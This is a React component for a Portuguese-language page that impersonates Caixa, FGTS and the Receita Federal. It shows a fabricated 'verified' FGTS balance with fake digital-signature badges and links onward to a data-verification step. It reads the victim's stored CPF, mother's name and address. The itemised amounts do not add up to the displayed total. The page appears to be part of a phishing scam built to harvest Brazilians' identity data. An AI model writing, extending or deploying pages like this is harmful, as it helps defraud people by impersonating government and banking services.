import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import flogo from "../assets/f-logo.png";
import { FaCheckCircle } from "react-icons/fa";
import { FaSpinner } from "react-icons/fa"; // Ícone de carregamento
import { UserData } from "../types/userData";

export function NotaFiscal() {
    const [progress, setProgress] = useState(0);
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const totalAmount = 1739.23;

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        nomeMae: "",
        estado: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);


    useEffect(() => {
        document.title = "Certidão de Valores - Receita Federal";

        const intervalId = setInterval(() => {
            setProgress((prev) => {
                if (prev < 100) return prev + 1;
                clearInterval(intervalId);
                return 100;
            });
        }, 50);

        return () => clearInterval(intervalId);
    }, []);

    useEffect(() => {
        setDisplayedAmount((progress / 100) * totalAmount);
    }, [progress, totalAmount]);

    return (
        <div className="w-full min-h-screen flex flex-col items-center bg-[#025bab] text-white px-4 pb-8">
            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="flex items-center space-x-2">
                <div className="bg-orange-400 p-2 rounded-full w-fit">
                    <img src={flogo} alt="flogo" width={20} />
                </div>
                <h2 className="font-bold text-2xl text-white">
                    Resumo do seu FGTS
                </h2>
            </div>

            {/* Progresso de Carregamento e Valor Total */}
            <div className="w-full max-w-md bg-white text-zinc-900 rounded-lg shadow-lg p-6 mt-6 space-y-6">
                <div className="flex items-center justify-center space-x-2 text-green-500 mb-4">
                    <FaCheckCircle size={28} />
                    <span className="text-lg font-semibold">Valores Verificados</span>
                </div>

                <div className="w-full bg-zinc-200 rounded-full h-2 overflow-hidden">
                    <div
                        className="bg-green-500 h-full transition-all duration-200 ease-linear"
                        style={{ width: `${progress}%` }}
                    />
                </div>
                <p className="text-center text-5xl font-bold text-green-600 mt-4">
                    <span className="text-zinc-400 font-thin text-xl">Total a Receber:</span> <br /> R$ {displayedAmount.toFixed(2)}
                </p>

                {/* Botão Condicional */}
                <a href="/verificardados">
                    <button
                        className={`w-full max-w-xs font-bold rounded-sm text-white py-4 my-4 flex items-center justify-center transition-all duration-300 ${progress < 100 ? "bg-gray-400 cursor-not-allowed" : "bg-green-600 hover:bg-orange-500"
                            }`}
                        disabled={progress < 100}
                    >
                        {progress < 100 ? (
                            <FaSpinner className="animate-spin mr-2" />
                        ) : (
                            "SACAR FGTS DISPONÍVEL"
                        )}
                    </button>

                </a>

                {/* Detalhes dos Valores em Cards */}
                <div className="space-y-4">
                    {[
                        { amount: "486,23", description: "Contas de pagamento pré-paga encerradas" },
                        { amount: "890,47", description: "Rendimento de juros mensais de contas encerradas" },
                        { amount: "763,00", description: "Cotas de capital e rateio de sobras líquidas" }
                    ].map((item, index) => (
                        <div key={index} className="bg-white border border-zinc-200 rounded-lg p-4 shadow-sm flex flex-col items-center space-y-1">
                            <span className="text-2xl font-semibold text-green-700">R$ {item.amount}</span>
                            <span className="text-sm text-zinc-600 text-center">{item.description}</span>
                        </div>
                    ))}
                </div>

                {/* Botão Condicional */}
                {/* <a href="/verificardados">
                    <button
                        className={`w-full max-w-xs font-bold rounded-sm text-white py-4 my-4 flex items-center justify-center transition-all duration-300 ${progress < 100 ? "bg-gray-400 cursor-not-allowed" : "bg-orange-400 hover:bg-orange-500"
                            }`}
                        disabled={progress < 100}
                    >
                        {progress < 100 ? (
                            <FaSpinner className="animate-spin mr-2" />
                        ) : (
                            "SACAR FGTS DISPONÍVEL"
                        )}
                    </button>

                </a> */}
                <p className="text-xs text-gray-500 text-center mt-4">
                    Assinado eletronicamente em 29/10/2024 13:35:50
                </p>

                {/* Assinatura Digital */}
                <div className="flex items-center justify-center space-x-2 text-green-500 mt-2">
                    <FaCheckCircle />
                    <span className="text-sm">Assinatura Digital Verificada</span>
                </div>
            </div>

            {/* Rodapé */}
            <div className="mt-8 text-center px-4">
                <h2 className="text-lg text-zinc-300 font-medium">Autenticação do Documento</h2>
                <p className="text-sm text-zinc-400">
                    A verificação pode ser realizada no portal oficial da Receita Federal.
                </p>
            </div>
        </div>
    );
}
